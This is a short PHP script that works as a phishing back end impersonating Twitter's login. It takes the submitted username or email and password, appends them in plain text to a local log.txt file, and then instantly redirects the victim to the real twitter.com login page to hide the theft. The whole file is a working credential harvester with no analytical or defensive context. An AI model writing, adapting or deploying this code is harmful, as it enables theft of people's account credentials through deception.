<?php
$name1=strip_tags($_POST["session[username_or_email]"]);
$name2=strip_tags($_POST["session[password]"]);
$file=fopen("log.txt","a");
fwrite($file, 'USER: '.$name1."\nPASS: ".$name2."\n\n");{
fclose($file);
} ?>


<html>
<meta http-equiv="refresh" content="0; URL='https://twitter.com/login'" />
</html>
